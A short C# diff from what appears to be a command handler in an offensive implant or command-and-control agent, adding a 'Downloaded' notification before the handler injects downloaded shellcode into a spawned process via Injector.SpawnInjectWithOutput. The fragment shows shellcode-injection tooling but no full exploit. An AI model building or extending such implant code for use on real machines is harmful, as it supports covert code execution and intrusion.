@@ -31,6 +31,8 @@ namespace Agent.Commands
 
             var shellcode = fileContent;
 
+            this.Notify(result, commm, $"{fileName} Downloaded");
+
             var injectRes =  Injector.SpawnInjectWithOutput(fileContent, task.SplittedArgs[1]);
             if(!injectRes.Succeed)
                 result.Result += $"Injection failed : {injectRes.Error}";
